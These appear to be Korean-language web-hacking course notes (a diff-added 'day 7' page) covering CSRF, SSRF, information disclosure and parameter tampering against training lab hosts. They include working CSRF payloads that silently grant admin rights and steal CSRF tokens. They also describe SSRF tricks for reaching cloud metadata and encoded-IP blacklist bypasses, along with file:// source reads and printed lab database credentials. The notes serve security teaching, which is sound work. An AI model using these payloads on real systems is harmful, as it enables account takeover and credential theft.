@@ -1,0 +1,560 @@
+7일차
+
+- CSRF 문제 2번 
+
+POST 방식으로 되어있을 때 
+어떻게 관리자가 똑같이 요청을 보내도록 
+
+POST sfdad.com/
+
+payload&lt;-  파라미터=?
+
+&lt;iframe id="test" style="display:none;" name="attackframe"&gt;&lt;/iframe&gt; 
+&lt;form target="&gt; 
+&lt;input name="파라미터이름"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+form.submit();
+&lt;/script&gt;
+
+1. iframe 
+2. script -&gt; fetch , xmlhttprequest, $.ajax , $.post &lt;-
+
+
+native javascript , vanila javascript, pure javascript 기본 자바스크립트 
+jquery
+
+document.getElementById("test").submit()
+document.getELementsByName("submitbutton")[0].onclick = function() {
+    asdflkj
+}
+$("#test").submit()&lt;-
+$(".class")
+
+const xhr = new XMLHttpRequest();
+xhr.open('post', 'URL');
+xhr.setRequestHeader('Custom-Header1', 'Hello');
+xhr.setRequestHeader('Custom-Header2', 'Test');
+const data = JSON.stringify({
+  title: 'foo',
+  body: 'bar',
+  userId: 1
+});
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(data);
+
+$.ajax({
+    url: '주소',
+    method: 'post',
+    data : 데이터,    
+    success: function (data, status, xhr) {
+       응답받아서 할거
+    },
+    헤더: 헤더
+});
+
+
+* 버프에서 확인했을 떄 request
+POST /bbs11/updatePostAuth HTTP/1.1
+Host: lab.eqst.co.kr:8442
+cookie:알아서 브라우저가 관리자거로 붙여서 요청날림
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+loginId=kkk%40k.com&amp;adminYn=2
+
+
+1. fetch사용 
+const url = 'https://lab.eqst.co.kr:8442/bbs11/updatePostAuth';
+const data = new URLSearchParams({
+  loginId: 'kkk@k.com',
+  adminYn: '2'
+});
+
+fetch(url, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+  },
+  body: data.toString()
+})
+
+
+2.xmlhttprequest 
+
+&lt;script&gt;const url = 'https://lab.eqst.co.kr:8442/bbs11/updatePostAuth';const data = 'loginId=kkk%40k.com&amp;adminYn=2';const xhr = new XMLHttpRequest();xhr.open('POST', url, true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');xhr.send(data);&lt;/script&gt;
+
+3. iframe 사용 
+
+  &lt;iframe id="hiddenIframe" name="hiddenIframe" style="display: none;"&gt;&lt;/iframe&gt;
+  &lt;form id="postForm" action="https://lab.eqst.co.kr:8442/bbs11/updatePostAuth" method="POST" target="hiddenIframe"&gt;
+    &lt;input type="hidden" name="loginId" value="kkk@k.com"&gt;
+    &lt;input type="hidden" name="adminYn" value="2"&gt;
+  &lt;/form&gt;
+
+  &lt;script&gt;    
+    window.onload = function() {
+      document.getElementById('postForm').submit();
+    };
+    -&gt;document.getElementById('postForm').submit();
+  &lt;/script&gt;
+
+
+
+CSRF 문제 3번
+
+CSRF토큰 
+
+1. 우선 토큰 발급해주는 페이지를 들러서 -&gt; authpage
+&lt;iframe ="authpage"&gt;&lt;/iframe&gt;
+
+&lt;html&gt; 
+&lt;head&gt;
+
+2. 그안의 csrftoken input type=hidden 숨겨져있는 것의 value를 꺼내와서
+
+문서를 다 불러오고 나서 가지고와 &lt;-
+var token = document.getElementsByName("csrf_token")[0].value;
+
+
+3. 다시 권한변경 페이지 파라미터 뒤에다가 탈취한 토큰을 붙여서 전송해 -&gt; updateTokenAuth
+fetch("https://lab.eqst.co.kr:8442/bbs11/updateTokenAuth?csrf_token=" + token+ "&amp;loginId=kkk%40k.com&amp;adminYn=2")
+
+&lt;iframe id="atk" src="https://lab.eqst.co.kr:8442/community15/authpage"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+ $.onload ={ fetch("https://lab.eqst.co.kr:8442/bbs11/updateTokenAuth?csrf_token=" + document.getElementById('atk').contentWindow.document.getElementsByName("csrf_token")[0].value+ "&amp;loginId=kkk%40k.com&amp;adminYn=2"); }
+&lt;/script&gt;
+
+1. iframe 안에있는 문서의 요소 
+2. 전부 로딩이 완료되고 나서 
+
+
+&lt;iframe id="atk" src="https://lab.eqst.co.kr:8442/community15/authpage"&gt;&lt;/iframe&gt;
+&lt;script&gt;var token = document.getElementById('atk').contentWindow.document.getElementsByName("csrf_token")[0].value;fetch("https://lab.eqst.co.kr:8442/bbs11/updateTokenAuth?csrf_token=" + token+ "&amp;loginId=kkk%40k.com&amp;adminYn=2");&lt;/script&gt;
+
+
+&lt;iframe id="atk" src="https://lab.eqst.co.kr:8442/community15/authpage" style="display:none;"&gt;&lt;/iframe&gt;
+&lt;script&gt; window.onload = function() {  var token = document.getElementById('atk').contentWindow.document.getElementsByName("csrf_token")[0].value;    fetch("https://lab.eqst.co.kr:8442/bbs11/updateTokenAuth?csrf_token=" + token+ "&amp;loginId=kkk%40k.com&amp;adminYn=2"); }&lt;/script&gt;
+
+fetch(
+    url:naver.com 
+    method:get 
+    success(data) {
+      data안에서 csrf토큰 찾아서 
+      fetch(권한변경페이지로 요청보내)
+    }    
+)
+
+xmlhttprequest 
+
+$.ajax 
+
+* 정보노출 
+
+
+99% 개발자 잘못  
+주석안지웟어
+로그안지웟어
+개발 테스트 하던거 안지웟
+기본폴더에 배포 
+개발 권핝서 
+co
+
+소스보기 -&gt; html소스, javascript소스, css소스 &lt;-
+           개발용서버주소 &lt;-
+   주석 -&gt; 정보를 획득
+
+응답 헤더
+
+authpage.php &lt;- 수정 
+authpage.bak 
+authpage.old 
+authpage.php.old
+
+&lt;? php 
+
+   db = db.connect("192.168.0.10","admin", "password", "mysql");
+   query = ""
+   result 
+?&gt;
+
+default 폴더에 배포 
+test.com/WEB-INF/web.xml 
+
+
+* SSRF 
+Server-side Request Forgery 
+
+XSS             vs             CSRF         vs           SSRF 
+피해자가 자기모르게       나는 권한이 없어서 실행X                    나는 접근을 못하지만
+악성스크립트 실행!         관리자한테  요청을 날리게 시켜서 실행!        서버가 하면 되는곳에 요청!
+
+1. 번역사이트, 아카이브, 문서뷰어, 이미지뷰어 
+파라미터에 URL이 들어가는 경우에만 공격이 가능!
+
+
+ papago.com/trans?url=https://yahoo.jp &lt;-
+
+      크롬   -&gt;         papago.com -&gt;  yahoo.jp 
+             &lt;-           번역        &lt;-
+      크롬  -&gt; papago.com 
+             -&gt; yahoo.jp
+
+2. 외부IP, 내부IP 
+   
+
+       213.23.39.12             -&gt;                papago.com   104.21.85.55 &lt;- port forwarding
+
+192.168.0.10                                                         -&gt; web 192.168.0.10 443   10.0.0.1
+192.168.0.20                                                         -&gt; db 192.168.0.20    10.0.0.2
+192.168.0.30                                                         -&gt; 관리자 192.168.30  10.0.0.3
+
+
+내 10 
+192.168.0.20 - 요청
+
+papago.com/?url=192.168.0.20
+               localhost:
+
+               AWS &lt;-
+
+               EC2 -&gt; 서버를 구동 &lt;- 메타데이터
+               169.254.169.254&lt;-
+
+               IAM/계정/  aws access token, aws secret &lt;- 
+               aws cli 
+
+- 대응방안
+1. 주소를 받는 기능 X 
+2. 백엔드에서 요청을 보낼때 한번더 확인을 하도록
+3. 사용자 입력값 검증 잘!
+   1) whitelist 
+   1 dog.jpg 
+   2 cat.jpg
+      s3.test.com/images/ &lt;-
+   2) blacklist 
+     url &lt;-
+     127.0.0.1
+     192.x.x.x 
+     10.x.x.X
+     169.x.x.x 
+     특정도메인못쓰게해
+     특정Ip도 못쓰게해 
+ 
+ 255 255 255 255 
+ 0xFFFFFFFF
+     ip -&gt; 169.154.169. &lt;-  https://0xA9FEA9FE  https://2852039166
+         - 16진수
+         - 10진수 
+         https://120398102938 &lt;-
+
+     mail.eqst.com -&gt; url shortener -&gt; 
+
+     공격자서버 도메인,ip 
+
+     seyong.kr &lt;-  abc.com. ,a,
+
+     302 Redirect -&gt; Follow X 
+     location: 169.254.169.254/metadata/
+
+
+   aws 웹서버   데이터   s3
+
+   aws.test.com &lt;-      &lt;img src="https://s3.test.com/images/dog.jpg"&gt;
+
+   &lt;img src="https://aws.tes.com/imageViewer?사진번호=3"&gt;
+
+   /imageViewer?url= 
+
+   image = requests.get("aws키 -&gt; s3접속 -&gt; 해당 url위치의 이미지를 꺼내와")
+   return image;
+
+http://eqst-ssrf-victim.com/include/db_conf.php
+
+
+===========================
+* SSRF 문제 2번
+===========================
+1. 풀이과정
+2. 정답
+===========================
+
+-&gt; URL Shortener 공격에 쓰지마~
+  피싱 스미싱 문자 링크 
+  
+ -&gt; https:/asdfjlj.asdckjasdfl.com./alekfjl?felwkfjalkwejlkwejf=awefkljewalkfjlkweajfwefljfleflawejljfaklfaejw
+
+bit.ly/asdf
+http://eqst-ssrf-victim.com/include/db_conf.php
+
+-&gt; 짧게 주소를 바꿔서 
+
+
+핵심문제!
+===========================
+* SSRF 문제 3번   -&gt; 40분 문제 풀이~
+===========================
+1. 풀이과정
+2. 정답
+
+Hint 1: 제대로 ID 비번 넣었는데 왜 안돼? 에러?
+        주소창 확인!
+===========================
+
+&lt;!-- 관리자페이지 : http://eqst-ssrf-victim.com:8098/admin.php?login_id=adminID&amp;login_pwd=adminPW
+ --&gt;
+https://lab.eqst.co.kr:8097/ssrf_3/admin.php?login_id=adminID&amp;login_pwd=adminPW
+https://lab.eqst.co.kr:8097/ssrf_3/urlviewer.php?url=공격주소 
+
+
+웹브라우저 
+https:// 
+http://
+ftp://
+smb://
+다른 프로토콜
+file:// test.txt 
+자기자신의 파일 불러옴 
+
+파일다운로드-&gt; Path Traversal &lt;
+................................................
+얘는 좀 시작부터 어려움
+===========================
+* SSRF 문제 4번 -&gt; 3시에 문제풀이~
+===========================
+1. 풀이과정 
+2. 정답
+
+Hint 1: img 태그 안의 src data를 base64로 디코딩해야 원문이 나옴
+Hint 2: 소스코드를 분석&lt;- 이미 백엔드에서 실행되고난 결과의 소스코드
+
+url=https:// &lt;- 
+    로컬 서버 하드 경로 &lt;-
+    file:// &lt;
+===========================
+
+파일을 읽어와서 소스를 확인해가면서 푸는 문제 
+
+php 실행되기 전 원래의 소스코드를 확인 &lt;- ssrf를 이용해서
+
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;h1&gt;완큰글씨&lt;/h1&gt;
+
+&lt;?php
+  여기만 php코드 
+  $ &lt;- 변수 
+  echo 문자열; -&gt; 웹페이지상에 찍어줍니다.
+  echo "&lt;h2&gt;짱큰글씨&lt;/h2&gt;" 
+  ?&gt;
+&lt;h3&gt;쪼끔큰글씨&lt;/h3&gt; 
+
+
+file://var/www/html/ssrf_2/admin.php &lt;-
+ 
+ https://test.com/ssrf_2/admin.php
+
+ /var/www/html/ssrf_2/admin.php &lt;- 
+
+ model 1 
+ 
+
+ https://ssrf_2/admin.php, html, phtml, .. 
+ MVC &lt;- 
+
+
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;body&gt;
+
+&lt;?php 
+
+ 백엔드에서 할거
+
+?&gt;
+&lt;script&gt;
+
+&lt;? 
+?&gt; 
+
+import requests 
+
+
+file://admin.php
+./admin.php 
+admin.php 
+
+
+1-&gt;admin.php 
+2-&gt;admin_login.php
+&lt;?php include_once "include/common/declare.php";?&gt;
+&lt;?php include_once "../request_log_ssrf2.php";?&gt;
+3.include/common/declare.php
+  property 
+  db.class 
+  common.util 
+4. db.class 
+
+/* DB Info */
+	/*
+	define( 'db_host' , 'localhost' ); 
+	define( 'db_user' , 'wpartner' );
+	define( 'db_pass' , 'wpartner' ); 
+	define( 'db_db' , 'emergency' );
+	*/
+
+/* RealDB	*/
+	
+	define( "db_host" , "127.0.0.1" ); 
+	define( "db_user" , "skinfosec" );
+	define( "db_pass" , "skinfosec" ); 
+	define( "db_db" , "skinfosec" );    
+
+
+    // op db [host: mariadb, 
+    
+    	if($id === "adminuser" &amp;&amp; $pw === "adminpassword")
+    
+       DB  ID:ssrf_user, PW:ssrf12#$]
+
+
+* 파라미터 변조 
+test.com/?param=3
+
+당연히 사용자가 시키는것만 할 줄알고
+나머지를 처리를 안했을때 생기는 취약점
+
+파라미터에 이것저것 넣어서 공격!
+
+개발자가 클라이언트의 입력값을 신뢰하여
+검증 절차를 누락시켰을 때 생기는 취약점
+
+http://lab.eqst.co.kr:8156/
+
+http://lab.eqst.co.kr:8156/m/board?id=1
+http://lab.eqst.co.kr:8156/m/board?id=2
+
+http://lab.eqst.co.kr:8156/m/board?id=3
+
+-&gt; 검증절차 잘하면댐 -&gt; ! 백엔드에서 !
+
+
+1. 주소 유추 
+
+test.com/board/edit?id=11
+10번은 내가쓴거고 
+11딴사람이
+
+test.com/board/list -&gt; 글쓰기 /board/write &lt;-
+
+test.com/notice/list -&gt; 글쓰기 /notice/write &lt;- 관리자인지 아닌지 검증하는 로직 누락 
+
+2. 로그인을 하고 안하고 테스트 
+
+test.com/file/download?id=1 -&gt; LMS 사이트 동영상강의 -&gt; 모의해킹 
+test.com/file/list &lt;- 자료실 리스트 회원만 다운받을수 잇음 -&gt; 로그인 
+test.com/file/download?id=1 -&gt; 다운받아짐
+
+3. 숫자 &lt;-
+
+포인트  = -99999999999999999999999999999999999999999999999
+
+상품가격 + 배송비 - 포인트 - 쿠폰 = 최종가격 -&gt; 물건 쇼핑몰 돈월
+
+판돈
+가위바위보 
+
+배팅금 = -9999999999999999999999999999
+짐
+
+보유금액 + 배팅금*10
+
+보유금액 +99999999999999999 -&gt; 보유
+
+90%확률로 지게만들어오
+
+보유금액을 100조
+
+if 포인트 입력값 &lt;  4000:
+   처리해줘~
+else:
+   너 포인트는 10만점까지만쓸수잇어~
+   오류처리 
+
+4. 정수형 오버플로우
+ int -&gt; -21억~21억
+ unsigned int -&gt; 0~42억까지
+ 과자 5000원 -&gt;  99999999999999999999999999999999개 살게요 
+ 
+ 실수형 
+
+ 2.1E10의몇승
+
+5. 파라미터 추측 
+   &lt;input id="title" name="title" value='제목'&gt;
+      제목
+   &lt;input id="content" name="content" value='내용'&gt;  
+    내용 
+    &lt;input id="count" value="100000"&gt;
+
+-&gt; test.com/board/write?title=제목&amp;content=내용&amp;count=99999999999999999
+=========================
+request 요청
+response 데이터를 가지고 크롬 javascript로 뭔가 데이터를 만들어낼때
+
+
+https://lab.eqst.co.kr:8110/practice/practice12/qna/
+https://lab.eqst.co.kr:8110/practice/practice12/qna/view?id=15382&amp;page=0
+https://lab.eqst.co.kr:8110/practice/practice12/qna/write
+https://      /practice/practice12/qna/deletebyid?id=15382
+
+https://lab.eqst.co.kr:8110/practice/practice12/notice/deletebyid?id=6063
+
+
+==========================
+* 쇼핑몰 문제 7번
+==========================
+1. 풀이과정
+2. 정답
+==========================
+ &lt;input type="password" class="form-control" id="pwdcf" placeholder="비밀번호 변경 시 입력" name="passwordconfirm" value=""&gt;
+        
+
+==========================
+* 쇼핑몰 문제 13번 
+==========================
+1. 풀이과정
+2. 정답
+
+Hint 1: 7번문제 + 12번문제 
+     파라미터 추가 + 권한검증이 안되어 있는거
+Hint 2: &lt;input type="Hidden" Value="값"&gt; &lt;- 글쓴이에 대한 정보
+    관리자 &lt;- 정보
+    name 파라미터 외않되?
+Hint 3: 글작성하는게 글쓰기만 있나?
+==========================
+
+  
+#####################################
+            명예의 전당
+#####################################
+        [     백상준       ]
+        [     박종원       ]
+        [     장상훈       ]
+        [     이윤지       ]
+        [     박정은       ]
+        [     이석진       ]
+        [     김상빈       ]
+        [     유주현       ]
+        [     이동은       ]
+        [  추시현, 김수민  ]            
+#####################################
+
+
+
+==========================
+* 쇼핑몰 문제 8
+==========================
+-&gt; 9 -&gt; 10
+</code></pre><div class="info">© 2025 Seyong Kim. All Rights Reserved.</div></div></body></html>
